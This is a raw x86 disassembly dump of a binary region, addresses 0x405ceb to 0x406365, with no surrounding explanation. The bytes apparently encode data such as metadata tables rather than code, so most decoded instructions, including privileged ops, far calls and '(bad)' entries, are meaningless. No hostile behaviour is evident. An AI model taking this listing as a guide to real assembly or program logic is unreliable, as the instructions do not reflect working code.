  405ceb:	12 63 02             	adc    0x2(%ebx),%ah
  405cee:	0a 00                	or     (%eax),%al
  405cf0:	d6                   	salc
  405cf1:	06                   	push   %es
  405cf2:	3f                   	aas
  405cf3:	15 06 00 64 1d       	adc    $0x1d640006,%eax
  405cf8:	55                   	push   %ebp
  405cf9:	00 16                	add    %dl,(%esi)
  405cfb:	00 01                	add    %al,(%ecx)
  405cfd:	17                   	pop    %ss
  405cfe:	e3 02                	jecxz  0x405d02
  405d00:	06                   	push   %es
  405d01:	00 33                	add    %dh,(%ebx)
  405d03:	0e                   	push   %cs
  405d04:	55                   	push   %ebp
  405d05:	00 06                	add    %al,(%esi)
  405d07:	00 73 06             	add    %dh,0x6(%ebx)
  405d0a:	63 02                	arpl   %eax,(%edx)
  405d0c:	06                   	push   %es
  405d0d:	00 72 0f             	add    %dh,0xf(%edx)
  405d10:	63 02                	arpl   %eax,(%edx)
  405d12:	06                   	push   %es
  405d13:	00 09                	add    %cl,(%ecx)
  405d15:	05 63 02 06 00       	add    $0x60263,%eax
  405d1a:	79 14                	jns    0x405d30
  405d1c:	63 02                	arpl   %eax,(%edx)
  405d1e:	06                   	push   %es
  405d1f:	00 28                	add    %ch,(%eax)
  405d21:	12 63 02             	adc    0x2(%ebx),%ah
  405d24:	16                   	push   %ss
  405d25:	00 41 12             	add    %al,0x12(%ecx)
  405d28:	60                   	pusha
  405d29:	15 1a 00 f8 13       	adc    $0x13f8001a,%eax
  405d2e:	81 1a 1a 00 7d 11    	sbbl   $0x117d001a,(%edx)
  405d34:	81 1a 8b 01 b1 14    	sbbl   $0x14b1018b,(%edx)
  405d3a:	00 00                	add    %al,(%eax)
  405d3c:	1a 00                	sbb    (%eax),%al
  405d3e:	1d 19 81 1a 06       	sbb    $0x61a8119,%eax
  405d43:	00 38                	add    %bh,(%eax)
  405d45:	15 f0 0f 06 00       	adc    $0x60ff0,%eax
  405d4a:	7a 00                	jp     0x405d4c
  405d4c:	f0 0f 06             	lock clts
  405d4f:	00 e7                	add    %ah,%bh
  405d51:	0f f0                	(bad)
  405d53:	0f 06                	clts
  405d55:	00 da                	add    %bl,%dl
  405d57:	00 f0                	add    %dh,%al
  405d59:	0f 06                	clts
  405d5b:	00 e0                	add    %ah,%al
  405d5d:	12 fa                	adc    %dl,%bh
  405d5f:	1c 06                	sbb    $0x6,%al
  405d61:	00 2f                	add    %ch,(%edi)
  405d63:	10 fa                	adc    %bh,%dl
  405d65:	1c 06                	sbb    $0x6,%al
  405d67:	00 ae 07 f0 0f 06    	add    %ch,0x60ff007(%esi)
  405d6d:	00 82 10 f0 0f 1e    	add    %al,0x1e0ff010(%edx)
  405d73:	00 26                	add    %ah,(%esi)
  405d75:	11 a8 17 06 00 9b    	adc    %ebp,-0x64fff9e9(%eax)
  405d7b:	1d ba 0e 06 00       	sbb    $0x60eba,%eax
  405d80:	d4 0e                	aam    $0xe
  405d82:	ba 0e 06 00 81       	mov    $0x8100060e,%edx
  405d87:	06                   	push   %es
  405d88:	ba 0e 06 00 76       	mov    $0x7600060e,%edx
  405d8d:	03 f0                	add    %eax,%esi
  405d8f:	0f 06                	clts
  405d91:	00 21                	add    %ah,(%ecx)
  405d93:	06                   	push   %es
  405d94:	9a 0b 0a 00 11 14 55 	lcall  $0x5514,$0x11000a0b
  405d9b:	00 0a                	add    %cl,(%edx)
  405d9d:	00 95 18 55 00 06    	add    %dl,0x6005518(%ebp)
  405da3:	00 d7                	add    %dl,%bh
  405da5:	04 55                	add    $0x55,%al
  405da7:	00 43 00             	add    %al,0x0(%ebx)
  405daa:	ee                   	out    %al,(%dx)
  405dab:	14 00                	adc    $0x0,%al
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 a4 05 bc 12 06 00 	add    %ah,0x612bc(%ebp,%eax,1)
  405db6:	12 00                	adc    (%eax),%al
  405db8:	c8 02 06 00          	enter  $0x602,$0x0
  405dbc:	b4 10                	mov    $0x10,%ah
  405dbe:	f0 0f 06             	lock clts
  405dc1:	00 17                	add    %dl,(%edi)
  405dc3:	1d 51 11 06 00       	sbb    $0x61151,%eax
  405dc8:	3a 08                	cmp    (%eax),%cl
  405dca:	f0 0f 06             	lock clts
  405dcd:	00 f9                	add    %bh,%cl
  405dcf:	14 f0                	adc    $0xf0,%al
  405dd1:	0f 06                	clts
  405dd3:	00 fd                	add    %bh,%ch
  405dd5:	05 f0 0f 22 00       	add    $0x220ff0,%eax
  405dda:	4e                   	dec    %esi
  405ddb:	12 57 13             	adc    0x13(%edi),%dl
  405dde:	22 00                	and    (%eax),%al
  405de0:	cf                   	iret
  405de1:	16                   	push   %ss
  405de2:	57                   	push   %edi
  405de3:	13 22                	adc    (%edx),%esp
  405de5:	00 7e 13             	add    %bh,0x13(%esi)
  405de8:	57                   	push   %edi
  405de9:	13 12                	adc    (%edx),%edx
  405deb:	00 76 13             	add    %dh,0x13(%esi)
  405dee:	9d                   	popf
  405def:	15 22 00 e7 16       	adc    $0x16e70022,%eax
  405df4:	57                   	push   %edi
  405df5:	13 06                	adc    (%esi),%eax
  405df7:	00 57 16             	add    %dl,0x16(%edi)
  405dfa:	fa                   	cli
  405dfb:	1c 06                	sbb    $0x6,%al
  405dfd:	00 ed                	add    %ch,%ch
  405dff:	11 f0                	adc    %esi,%eax
  405e01:	0f 06                	clts
  405e03:	00 5e 16             	add    %bl,0x16(%esi)
  405e06:	fa                   	cli
  405e07:	1c 12                	sbb    $0x12,%al
  405e09:	00 12                	add    %dl,(%edx)
  405e0b:	13 fa                	adc    %edx,%edi
  405e0d:	1c 06                	sbb    $0x6,%al
  405e0f:	00 a6 0f fa 1c 06    	add    %ah,0x61cfa0f(%esi)
  405e15:	00 fb                	add    %bh,%bl
  405e17:	00 fa                	add    %bh,%dl
  405e19:	1c 06                	sbb    $0x6,%al
  405e1b:	00 d7                	add    %dl,%bh
  405e1d:	11 f0                	adc    %esi,%eax
  405e1f:	0f 06                	clts
  405e21:	00 08                	add    %cl,(%eax)
  405e23:	10 fa                	adc    %bh,%dl
  405e25:	1c 06                	sbb    $0x6,%al
  405e27:	00 4e 05             	add    %cl,0x5(%esi)
  405e2a:	fa                   	cli
  405e2b:	1c 06                	sbb    $0x6,%al
  405e2d:	00 12                	add    %dl,(%edx)
  405e2f:	05 fa 1c 06 00       	add    $0x61cfa,%eax
  405e34:	49                   	dec    %ecx
  405e35:	10 fa                	adc    %bh,%dl
  405e37:	1c 06                	sbb    $0x6,%al
  405e39:	00 2d 05 fa 1c 06    	add    %ch,0x61cfa05
  405e3f:	00 c0                	add    %al,%al
  405e41:	11 fa                	adc    %edi,%edx
  405e43:	1c 06                	sbb    $0x6,%al
  405e45:	00 9f 13 f0 0f 06    	add    %bl,0x60ff013(%edi)
  405e4b:	00 8d 1c f0 0f 06    	add    %cl,0x60ff01c(%ebp)
  405e51:	00 01                	add    %al,(%ecx)
  405e53:	18 9d 15 06 00 da    	sbb    %bl,-0x25fff9eb(%ebp)
  405e59:	05 f0 0f 06 00       	add    $0x60ff0,%eax
  405e5e:	2d 03 fa 1c 06       	sub    $0x61cfa03,%eax
  405e63:	00 c7                	add    %al,%bh
  405e65:	00 f0                	add    %dh,%al
  405e67:	0f 06                	clts
  405e69:	00 c8                	add    %cl,%al
  405e6b:	05 f0 0f 06 00       	add    $0x60ff0,%eax
  405e70:	46                   	inc    %esi
  405e71:	06                   	push   %es
  405e72:	f0 0f 06             	lock clts
  405e75:	00 30                	add    %dh,(%eax)
  405e77:	18 63 02             	sbb    %ah,0x2(%ebx)
  405e7a:	06                   	push   %es
  405e7b:	00 3f                	add    %bh,(%edi)
  405e7d:	08 63 02             	or     %ah,0x2(%ebx)
  405e80:	0a 00                	or     (%eax),%al
  405e82:	b3 0f                	mov    $0xf,%bl
  405e84:	10 11                	adc    %dl,(%ecx)
  405e86:	0a 00                	or     (%eax),%al
  405e88:	3e 05 10 11 00 00    	ds add $0x1110,%eax
  405e8e:	00 00                	add    %al,(%eax)
  405e90:	40                   	inc    %eax
  405e91:	01 00                	add    %eax,(%eax)
  405e93:	00 00                	add    %al,(%eax)
  405e95:	00 01                	add    %al,(%ecx)
  405e97:	00 01                	add    %al,(%ecx)
  405e99:	00 01                	add    %al,(%ecx)
  405e9b:	00 10                	add    %dl,(%eax)
  405e9d:	00 cb                	add    %cl,%bl
  405e9f:	0f 7a                	(bad)
  405ea1:	1a 05 00 01 00 01    	sbb    0x1000100,%al
  405ea7:	00 81 01 10 00 13    	add    %al,0x13001001(%ecx)
  405ead:	17                   	pop    %ss
  405eae:	7a 1a                	jp     0x405eca
  405eb0:	05 00 01 00 03       	add    $0x3000100,%eax
  405eb5:	00 81 01 10 00 9b    	add    %al,-0x64ffefff(%ecx)
  405ebb:	19 98 11 05 00 13    	sbb    %ebx,0x13000511(%eax)
  405ec1:	00 06                	add    %al,(%esi)
  405ec3:	00 00                	add    %al,(%eax)
  405ec5:	00 10                	add    %dl,(%eax)
  405ec7:	00 ae 12 08 0f 05    	add    %ch,0x50f0812(%esi)
  405ecd:	00 1e                	add    %bl,(%esi)
  405ecf:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ed2:	00 00                	add    %al,(%eax)
  405ed4:	10 00                	adc    %al,(%eax)
  405ed6:	33 17                	xor    (%edi),%edx
  405ed8:	37                   	aaa
  405ed9:	14 05                	adc    $0x5,%al
  405edb:	00 1e                	add    %bl,(%esi)
  405edd:	00 26                	add    %ah,(%esi)
  405edf:	00 81 01 10 00 8a    	add    %al,-0x75ffefff(%ecx)
  405ee5:	10 37                	adc    %dh,(%edi)
  405ee7:	14 05                	adc    $0x5,%al
  405ee9:	00 1e                	add    %bl,(%esi)
  405eeb:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ef1:	00 47 13             	add    %al,0x13(%edi)
  405ef4:	37                   	aaa
  405ef5:	14 05                	adc    $0x5,%al
  405ef7:	00 1e                	add    %bl,(%esi)
  405ef9:	00 2f                	add    %ch,(%edi)
  405efb:	00 81 01 10 00 58    	add    %al,0x58001001(%ecx)
  405f01:	15 37 14 05 00       	adc    $0x51437,%eax
  405f06:	1e                   	push   %ds
  405f07:	00 30                	add    %dh,(%eax)
  405f09:	00 81 01 10 00 57    	add    %al,0x57001001(%ecx)
  405f0f:	0f 37                	getsec
  405f11:	14 05                	adc    $0x5,%al
  405f13:	00 1e                	add    %bl,(%esi)
  405f15:	00 36                	add    %dh,(%esi)
  405f17:	00 81 01 10 00 52    	add    %al,0x52001001(%ecx)
  405f1d:	15 37 14 05 00       	adc    $0x51437,%eax
  405f22:	1f                   	pop    %ds
  405f23:	00 38                	add    %bh,(%eax)
  405f25:	00 02                	add    %al,(%edx)
  405f27:	01 00                	add    %eax,(%eax)
  405f29:	00 08                	add    %cl,(%eax)
  405f2b:	02 00                	add    (%eax),%al
  405f2d:	00 39                	add    %bh,(%ecx)
  405f2f:	00 1f                	add    %bl,(%edi)
  405f31:	00 3e                	add    %bh,(%esi)
  405f33:	00 81 01 10 00 98    	add    %al,-0x67ffefff(%ecx)
  405f39:	0e                   	push   %cs
  405f3a:	37                   	aaa
  405f3b:	14 05                	adc    $0x5,%al
  405f3d:	00 23                	add    %ah,(%ebx)
  405f3f:	00 3e                	add    %bh,(%esi)
  405f41:	00 81 01 10 00 61    	add    %al,0x61001001(%ecx)
  405f47:	1d 37 14 05 00       	sbb    $0x51437,%eax
  405f4c:	23 00                	and    (%eax),%eax
  405f4e:	41                   	inc    %ecx
  405f4f:	00 81 01 10 00 94    	add    %al,-0x6bffefff(%ecx)
  405f55:	19 76 19             	sbb    %esi,0x19(%esi)
  405f58:	05 00 24 00 46       	add    $0x46002400,%eax
  405f5d:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f63:	00 00                	add    %al,(%eax)
  405f65:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f6b:	00 01                	add    %al,(%ecx)
  405f6d:	00 10                	add    %dl,(%eax)
  405f6f:	00 0d 01 f7 0f 05    	add    %cl,0x50ff701
  405f75:	00 26                	add    %ah,(%esi)
  405f77:	00 4b 00             	add    %cl,0x0(%ebx)
  405f7a:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f80:	f7 0f 05 00 2d 00    	testl  $0x2d0005,(%edi)
  405f86:	52                   	push   %edx
  405f87:	00 00                	add    %al,(%eax)
  405f89:	01 00                	add    %eax,(%eax)
  405f8b:	00 58 01             	add    %bl,0x1(%eax)
  405f8e:	00 00                	add    %al,(%eax)
  405f90:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f95:	00 13                	add    %dl,(%ebx)
  405f97:	01 00                	add    %eax,(%eax)
  405f99:	00 38                	add    %bh,(%eax)
  405f9b:	00 00                	add    %al,(%eax)
  405f9d:	00 51 00             	add    %dl,0x0(%ecx)
  405fa0:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405fa5:	00 10                	add    %dl,(%eax)
  405fa7:	00 9d 17 c1 0d 05    	add    %bl,0x50dc117(%ebp)
  405fad:	00 2e                	add    %ch,(%esi)
  405faf:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fb3:	00 10                	add    %dl,(%eax)
  405fb5:	00 5a 10             	add    %bl,0x10(%edx)
  405fb8:	c1 0d 05 00 2f 00 5f 	rorl   $0x5f,0x2f0005
  405fbf:	00 01                	add    %al,(%ecx)
  405fc1:	00 10                	add    %dl,(%eax)
  405fc3:	00 67 1c             	add    %ah,0x1c(%edi)
  405fc6:	c1 0d 05 00 31 00 63 	rorl   $0x63,0x310005
  405fcd:	00 01                	add    %al,(%ecx)
  405fcf:	00 10                	add    %dl,(%eax)
  405fd1:	00 dc                	add    %bl,%ah
  405fd3:	0d c1 0d 05 00       	or     $0x50dc1,%eax
  405fd8:	33 00                	xor    (%eax),%eax
  405fda:	6a 00                	push   $0x0
  405fdc:	01 01                	add    %eax,(%ecx)
  405fde:	00 00                	add    %al,(%eax)
  405fe0:	13 08                	adc    (%eax),%ecx
  405fe2:	c1 0d 39 00 3a 00 95 	rorl   $0x95,0x3a0039
  405fe9:	00 00                	add    %al,(%eax)
  405feb:	00 10                	add    %dl,(%eax)
  405fed:	00 88 17 c1 0d 05    	add    %cl,0x50dc117(%eax)
  405ff3:	00 47 00             	add    %al,0x0(%edi)
  405ff6:	95                   	xchg   %eax,%ebp
  405ff7:	00 00                	add    %al,(%eax)
  405ff9:	00 10                	add    %dl,(%eax)
  405ffb:	00 92 17 c1 0d 05    	add    %dl,0x50dc117(%edx)
  406001:	00 47 00             	add    %al,0x0(%edi)
  406004:	99                   	cltd
  406005:	00 81 01 10 00 88    	add    %al,-0x77ffefff(%ecx)
  40600b:	12 c1                	adc    %cl,%al
  40600d:	0d 05 00 47 00       	or     $0x470005,%eax
  406012:	a2 00 00 01 00       	mov    %al,0x10000
  406017:	00 49 01             	add    %cl,0x1(%ecx)
  40601a:	00 00                	add    %al,(%eax)
  40601c:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406021:	00 13                	add    %dl,(%ebx)
  406023:	01 00                	add    %eax,(%eax)
  406025:	00 1b                	add    %bl,(%ebx)
  406027:	01 00                	add    %eax,(%eax)
  406029:	00 51 00             	add    %dl,0x0(%ecx)
  40602c:	48                   	dec    %eax
  40602d:	00 a4 00 16 00 a2 18 	add    %ah,0x18a20016(%eax,%eax,1)
  406034:	12 00                	adc    (%eax),%al
  406036:	16                   	push   %ss
  406037:	00 af 18 12 00 16    	add    %ch,0x16001218(%edi)
  40603d:	00 08                	add    %cl,(%eax)
  40603f:	11 12                	adc    %edx,(%edx)
  406041:	00 16                	add    %dl,(%esi)
  406043:	00 0f                	add    %cl,(%edi)
  406045:	0f 12 00             	movlps (%eax),%xmm0
  406048:	16                   	push   %ss
  406049:	00 39                	add    %bh,(%ecx)
  40604b:	13 12                	adc    (%edx),%edx
  40604d:	00 16                	add    %dl,(%esi)
  40604f:	00 4d 06             	add    %cl,0x6(%ebp)
  406052:	12 00                	adc    (%eax),%al
  406054:	16                   	push   %ss
  406055:	00 f1                	add    %dh,%cl
  406057:	1c 12                	sbb    $0x12,%al
  406059:	00 16                	add    %dl,(%esi)
  40605b:	00 9e 02 12 00 16    	add    %bl,0x16001202(%esi)
  406061:	00 a2 08 12 00 16    	add    %ah,0x16001208(%edx)
  406067:	00 55 08             	add    %dl,0x8(%ebp)
  40606a:	12 00                	adc    (%eax),%al
  40606c:	16                   	push   %ss
  40606d:	00 9c 08 15 00 16 00 	add    %bl,0x160015(%eax,%ecx,1)
  406074:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406075:	0d 12 00 16 00       	or     $0x160012,%eax
  40607a:	14 01                	adc    $0x1,%al
  40607c:	19 00                	sbb    %eax,(%eax)
  40607e:	16                   	push   %ss
  40607f:	00 d0                	add    %dl,%al
  406081:	10 12                	adc    %dl,(%edx)
  406083:	00 16                	add    %dl,(%esi)
  406085:	00 72 02             	add    %dh,0x2(%edx)
  406088:	12 00                	adc    (%eax),%al
  40608a:	16                   	push   %ss
  40608b:	00 7b 03             	add    %bh,0x3(%ebx)
  40608e:	12 00                	adc    (%eax),%al
  406090:	16                   	push   %ss
  406091:	00 46 1c             	add    %al,0x1c(%esi)
  406094:	12 00                	adc    (%eax),%al
  406096:	16                   	push   %ss
  406097:	00 a8 12 12 00 11    	add    %ch,0x11001212(%eax)
  40609d:	00 87 04 21 00 11    	add    %al,0x11002104(%edi)
  4060a3:	00 6c 04 25          	add    %ch,0x25(%esp,%eax,1)
  4060a7:	00 11                	add    %dl,(%ecx)
  4060a9:	00 3c 04             	add    %bh,(%esp,%eax,1)
  4060ac:	29 00                	sub    %eax,(%eax)
  4060ae:	11 00                	adc    %eax,(%eax)
  4060b0:	d2 03                	rolb   %cl,(%ebx)
  4060b2:	2d 00 11 00 54       	sub    $0x54001100,%eax
  4060b7:	04 2d                	add    $0x2d,%al
  4060b9:	00 11                	add    %dl,(%ecx)
  4060bb:	00 b7 03 30 00 11    	add    %dh,0x11003003(%edi)
  4060c1:	00 9a 03 34 00 31    	add    %bl,0x31003403(%edx)
  4060c7:	00 80 03 37 00 11    	add    %al,0x11003703(%eax)
  4060cd:	00 ee                	add    %ch,%dh
  4060cf:	03 30                	add    (%eax),%esi
  4060d1:	00 11                	add    %dl,(%ecx)
  4060d3:	00 22                	add    %ah,(%edx)
  4060d5:	04 3a                	add    $0x3a,%al
  4060d7:	00 11                	add    %dl,(%ecx)
  4060d9:	00 04 04             	add    %al,(%esp,%eax,1)
  4060dc:	34 00                	xor    $0x0,%al
  4060de:	16                   	push   %ss
  4060df:	00 8c 12 dc 00 06 06 	add    %cl,0x60600dc(%edx,%edx,1)
  4060e6:	a2 02 06 01 56       	mov    %al,0x56010602
  4060eb:	80 77 02 09          	xorb   $0x9,0x2(%edi)
  4060ef:	01 56 80             	add    %edx,-0x80(%esi)
  4060f2:	ce                   	into
  4060f3:	01 09                	add    %ecx,(%ecx)
  4060f5:	01 56 80             	add    %edx,-0x80(%esi)
  4060f8:	bb 01 09 01 31       	mov    $0x31010901,%ebx
  4060fd:	00 fe                	add    %bh,%dh
  4060ff:	01 12                	add    %edx,(%edx)
  406101:	00 16                	add    %dl,(%esi)
  406103:	00 51 17             	add    %dl,0x17(%ecx)
  406106:	30 01                	xor    %al,(%ecx)
  406108:	16                   	push   %ss
  406109:	00 0b                	add    %cl,(%ebx)
  40610b:	00 43 01             	add    %al,0x1(%ebx)
  40610e:	51                   	push   %ecx
  40610f:	80 97 0d 3a 00 51 80 	adcb   $0x80,0x51003a0d(%edi)
  406116:	93                   	xchg   %eax,%ebx
  406117:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  40611c:	8a 0d 3a 00 51 80    	mov    0x8051003a,%cl
  406122:	6e                   	outsb  %ds:(%esi),(%dx)
  406123:	0d 3a 00 21 00       	or     $0x21003a,%eax
  406128:	f5                   	cmc
  406129:	1c 29                	sbb    $0x29,%al
  40612b:	00 21                	add    %ah,(%ecx)
  40612d:	00 d6                	add    %dl,%dh
  40612f:	1c 29                	sbb    $0x29,%al
  406131:	00 31                	add    %dh,(%ecx)
  406133:	00 f6                	add    %dh,%dh
  406135:	19 29                	sbb    %ebp,(%ecx)
  406137:	00 33                	add    %dh,(%ebx)
  406139:	01 77 01             	add    %esi,0x1(%edi)
  40613c:	8b 01                	mov    (%ecx),%eax
  40613e:	11 00                	adc    %eax,(%eax)
  406140:	64 05 8f 01 01 00    	fs add $0x1018f,%eax
  406146:	96                   	xchg   %eax,%esi
  406147:	10 30                	adc    %dh,(%eax)
  406149:	01 01                	add    %eax,(%ecx)
  40614b:	00 b7 11 3a 00 01    	add    %dh,0x1003a11(%edi)
  406151:	00 96 10 30 01 01    	add    %dl,0x1013010(%esi)
  406157:	00 31                	add    %dh,(%ecx)
  406159:	14 c7                	adc    $0xc7,%al
  40615b:	01 01                	add    %eax,(%ecx)
  40615d:	00 a9 07 12 00 01    	add    %ch,0x1001207(%ecx)
  406163:	00 89 07 12 00 01    	add    %cl,0x1001207(%ecx)
  406169:	00 ab 0a 37 00 01    	add    %ch,0x100370a(%ebx)
  40616f:	00 09                	add    %cl,(%ecx)
  406171:	08 02                	or     %al,(%edx)
  406173:	02 01                	add    (%ecx),%al
  406175:	00 9f 1a c7 01 01    	add    %bl,0x101c71a(%edi)
  40617b:	00 96 10 30 01 01    	add    %dl,0x1013010(%esi)
  406181:	00 88 1c 06 02 06    	add    %cl,0x602061c(%eax)
  406187:	06                   	push   %es
  406188:	a2 02 3a 00 56       	mov    %al,0x56003a02
  40618d:	80 ff 11             	cmp    $0x11,%bh
  406190:	02 02                	add    (%edx),%al
  406192:	56                   	push   %esi
  406193:	80 52 0f 02          	adcb   $0x2,0xf(%edx)
  406197:	02 56 80             	add    -0x80(%esi),%dl
  40619a:	77 12                	ja     0x4061ae
  40619c:	02 02                	add    (%edx),%al
  40619e:	56                   	push   %esi
  40619f:	80 8d 1c 02 02 56 80 	orb    $0x80,0x5602021c(%ebp)
  4061a6:	c5 0c 02             	lds    (%edx,%eax,1),%ecx
  4061a9:	02 56 80             	add    -0x80(%esi),%dl
  4061ac:	e1 13                	loope  0x4061c1
  4061ae:	02 02                	add    (%edx),%al
  4061b0:	56                   	push   %esi
  4061b1:	80 c7 00             	add    $0x0,%bh
  4061b4:	02 02                	add    (%edx),%al
  4061b6:	56                   	push   %esi
  4061b7:	80 82 10 02 02 56 80 	addb   $0x80,0x56020210(%edx)
  4061be:	0c 19                	or     $0x19,%al
  4061c0:	02 02                	add    (%edx),%al
  4061c2:	56                   	push   %esi
  4061c3:	80 46 06 02          	addb   $0x2,0x6(%esi)
  4061c7:	02 56 80             	add    -0x80(%esi),%dl
  4061ca:	ae                   	scas   %es:(%edi),%al
  4061cb:	07                   	pop    %es
  4061cc:	02 02                	add    (%edx),%al
  4061ce:	56                   	push   %esi
  4061cf:	80 46 1d 02          	addb   $0x2,0x1d(%esi)
  4061d3:	02 33                	add    (%ebx),%dh
  4061d5:	01 18                	add    %ebx,(%eax)
  4061d7:	02 fd                	add    %ch,%bh
  4061d9:	02 08                	add    (%eax),%cl
  4061db:	26 00 00             	add    %al,%es:(%eax)
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	96                   	xchg   %eax,%esi
  4061e1:	00 9f 10 0a 00 01    	add    %bl,0x1000a10(%edi)
  4061e7:	00 78 20             	add    %bh,0x20(%eax)
  4061ea:	00 00                	add    %al,(%eax)
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	86 18                	xchg   %bl,(%eax)
  4061f0:	03 15 0e 00 01 00    	add    0x1000e,%edx
  4061f6:	f8                   	clc
  4061f7:	26 00 00             	add    %al,%es:(%eax)
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	96                   	xchg   %eax,%esi
  4061fd:	00 09                	add    %cl,(%ecx)
  4061ff:	17                   	pop    %ss
  406200:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  406205:	28 00                	sub    %al,(%eax)
  406207:	00 00                	add    %al,(%eax)
  406209:	00 91 00 39 0d 1d    	add    %dl,0x1d0d3900(%ecx)
  40620f:	00 01                	add    %al,(%ecx)
  406211:	00 c0                	add    %al,%al
  406213:	28 00                	sub    %al,(%eax)
  406215:	00 00                	add    %al,(%eax)
  406217:	00 91 18 09 15 0a    	add    %dl,0xa150918(%ecx)
  40621d:	00 01                	add    %al,(%ecx)
  40621f:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  406225:	00 96 08 50 1a 3d    	add    %dl,0x3d1a5008(%esi)
  40622b:	00 01                	add    %al,(%ecx)
  40622d:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  406233:	00 96 08 5e 1a 42    	add    %dl,0x421a5e08(%esi)
  406239:	00 01                	add    %al,(%ecx)
  40623b:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406241:	00 96 08 34 1a 48    	add    %dl,0x481a3408(%esi)
  406247:	00 02                	add    %al,(%edx)
  406249:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  40624f:	00 96 08 42 1a 4d    	add    %dl,0x4d1a4208(%esi)
  406255:	00 02                	add    %al,(%edx)
  406257:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  40625d:	00 91 08 90 13 53    	add    %dl,0x53139008(%ecx)
  406263:	00 03                	add    %al,(%ebx)
  406265:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  40626b:	00 91 08 9b 13 58    	add    %dl,0x58139b08(%ecx)
  406271:	00 03                	add    %al,(%ebx)
  406273:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406279:	00 91 08 18 0b 5e    	add    %dl,0x5e0b1808(%ecx)
  40627f:	00 04 00             	add    %al,(%eax,%eax,1)
  406282:	b4 20                	mov    $0x20,%ah
  406284:	00 00                	add    %al,(%eax)
  406286:	00 00                	add    %al,(%eax)
  406288:	91                   	xchg   %eax,%ecx
  406289:	08 27                	or     %ah,(%edi)
  40628b:	0b 62 00             	or     0x0(%edx),%esp
  40628e:	04 00                	add    $0x0,%al
  406290:	bc 20 00 00 00       	mov    $0x20,%esp
  406295:	00 91 08 cd 19 5e    	add    %dl,0x5e19cd08(%ecx)
  40629b:	00 05 00 c3 20 00    	add    %al,0x20c300
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 91 08 d8 19 62    	add    %dl,0x6219d808(%ecx)
  4062a9:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 91 08 ce 0a 67    	add    %dl,0x670ace08(%ecx)
  4062b7:	00 06                	add    %al,(%esi)
  4062b9:	00 d2                	add    %dl,%dl
  4062bb:	20 00                	and    %al,(%eax)
  4062bd:	00 00                	add    %al,(%eax)
  4062bf:	00 91 08 dc 0a 6c    	add    %dl,0x6c0adc08(%ecx)
  4062c5:	00 06                	add    %al,(%esi)
  4062c7:	00 da                	add    %bl,%dl
  4062c9:	20 00                	and    %al,(%eax)
  4062cb:	00 00                	add    %al,(%eax)
  4062cd:	00 96 08 49 03 1d    	add    %dl,0x1d034908(%esi)
  4062d3:	00 07                	add    %al,(%edi)
  4062d5:	00 e1                	add    %ah,%cl
  4062d7:	20 00                	and    %al,(%eax)
  4062d9:	00 00                	add    %al,(%eax)
  4062db:	00 96 08 59 03 72    	add    %dl,0x72035908(%esi)
  4062e1:	00 07                	add    %al,(%edi)
  4062e3:	00 e9                	add    %ch,%cl
  4062e5:	20 00                	and    %al,(%eax)
  4062e7:	00 00                	add    %al,(%eax)
  4062e9:	00 91 08 f9 02 77    	add    %dl,0x7702f908(%ecx)
  4062ef:	00 08                	add    %cl,(%eax)
  4062f1:	00 f0                	add    %dh,%al
  4062f3:	20 00                	and    %al,(%eax)
  4062f5:	00 00                	add    %al,(%eax)
  4062f7:	00 91 08 88 0b 67    	add    %dl,0x670b8808(%ecx)
  4062fd:	00 08                	add    %cl,(%eax)
  4062ff:	00 f7                	add    %dh,%bh
  406301:	20 00                	and    %al,(%eax)
  406303:	00 00                	add    %al,(%eax)
  406305:	00 91 08 91 0b 6c    	add    %dl,0x6c0b9108(%ecx)
  40630b:	00 08                	add    %cl,(%eax)
  40630d:	00 ff                	add    %bh,%bh
  40630f:	20 00                	and    %al,(%eax)
  406311:	00 00                	add    %al,(%eax)
  406313:	00 96 08 ee 0e 7b    	add    %dl,0x7b0eee08(%esi)
  406319:	00 09                	add    %cl,(%ecx)
  40631b:	00 06                	add    %al,(%esi)
  40631d:	21 00                	and    %eax,(%eax)
  40631f:	00 00                	add    %al,(%eax)
  406321:	00 96 08 fb 0e 7f    	add    %dl,0x7f0efb08(%esi)
  406327:	00 09                	add    %cl,(%ecx)
  406329:	00 0e                	add    %cl,(%esi)
  40632b:	21 00                	and    %eax,(%eax)
  40632d:	00 00                	add    %al,(%eax)
  40632f:	00 96 08 e5 0c 1d    	add    %dl,0x1d0ce508(%esi)
  406335:	00 0a                	add    %cl,(%edx)
  406337:	00 15 21 00 00 00    	add    %dl,0x21
  40633d:	00 96 08 f6 0c 72    	add    %dl,0x720cf608(%esi)
  406343:	00 0a                	add    %cl,(%edx)
  406345:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406349:	00 00                	add    %al,(%eax)
  40634b:	00 96 00 23 1a 0a    	add    %dl,0xa1a2300(%esi)
  406351:	00 0b                	add    %cl,(%ebx)
  406353:	00 1d 21 00 00 00    	add    %bl,0x21
  406359:	00 91 00 6a 07 84    	add    %dl,-0x7bf89600(%ecx)
  40635f:	00 0b                	add    %cl,(%ebx)
  406361:	00 28                	add    %ch,(%eax)
  406363:	21 00                	and    %eax,(%eax)
  406365:	00 00                	add    %al,(%eax)
